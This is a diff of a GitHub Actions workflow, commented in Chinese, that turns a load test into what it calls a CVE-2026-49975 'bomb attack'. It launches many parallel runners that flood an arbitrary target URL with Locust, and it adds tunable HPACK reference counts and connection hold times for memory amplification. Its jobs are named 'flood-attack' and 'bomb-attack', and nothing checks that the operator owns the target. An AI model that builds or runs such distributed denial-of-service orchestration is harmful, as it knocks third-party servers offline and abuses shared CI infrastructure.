@@ -1,27 +1,34 @@
-name: Dynamic Sharded Server Load Test
+name: CVE-2026-49975 分布式内存消耗测试
 
 on:
   workflow_dispatch:
     inputs:
       target_url:
-        description: '1. 目标 URL (例如: https://api.yourdomain.com)'
+        description: '1. 目标 URL (例如: https://your-nginx-server.com)'
         required: true
         default: 'https://example.com'
       threads_per_shard:
-        description: '2. 每个分片的请求线程数'
+        description: '2. 每个分片的并发线程数（炸弹用户数）'
         required: true
         default: '100'
       shard_count:
-        description: '3. 分片数量 (将启动对应数量的虚拟机)'
+        description: '3. 分片数量（启动对应数量的虚拟机）'
         required: true
         default: '15'
       run_time_minutes:
-        description: '4. 请求时间 (单位: 分钟)'
+        description: '4. 测试时长 (单位: 分钟)'
         required: true
         default: '5'
+      hpack_references:
+        description: '5. HPACK 索引引用次数 (越大内存放大越狠，建议 1024~4096)'
+        required: false
+        default: '2048'
+      hold_seconds:
+        description: '6. 炸弹连接保持秒数 (建议 10~30 秒)'
+        required: false
+        default: '15'
 
 jobs:
-  # 任务一：根据输入的 shard_count 动态生成矩阵数组
   generate-matrix:
     runs-on: ubuntu-latest
     outputs:
@@ -30,18 +37,15 @@ jobs:
       - id: set-matrix
         run: |
           SHARD_COUNT=${{ github.event.inputs.shard_count }}
-          # 使用 Python 生成类似 [1, 2, 3, ..., N] 的 JSON 数组
           JSON_ARRAY=$(python3 -c "import json; print(json.dumps(list(range(1, $SHARD_COUNT + 1))))")
           echo "matrix_array=$JSON_ARRAY" >> $GITHUB_OUTPUT
 
-  # 任务二：读取矩阵，真正开始轰炸服务器
-  flood-attack:
+  bomb-attack:
     needs: generate-matrix
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        # 动态接收来自上一个任务的数组
         shard: ${{ fromJson(needs.generate-matrix.outputs.matrix_array) }}
 
     steps:
@@ -56,12 +60,17 @@ jobs:
       - name: Install Locust
         run: pip install locust==2.32.2
 
-      - name: Fire Requests - Shard ${{ matrix.shard }}
+      - name: 💣 CVE-2026-49975 Bomb Test - Shard ${{ matrix.shard }}
         run: |
-          # 瞬间拉满线程数并持续指定分钟
           locust -f locustfile.py \
             --headless \
             -u ${{ github.event.inputs.threads_per_shard }} \
             -r ${{ github.event.inputs.threads_per_shard }} \
             --run-time ${{ github.event.inputs.run_time_minutes }}m \
             --host ${{ github.event.inputs.target_url }}
+        env:
+          LOCUST_REFERENCES: ${{ github.event.inputs.hpack_references }}
+          LOCUST_HOLD_SECONDS: ${{ github.event.inputs.hold_seconds }}
+
+      - name: ✅ Shard ${{ matrix.shard }} 完成
+        run: echo "Shard ${{ matrix.shard }} 炸弹攻击完成"
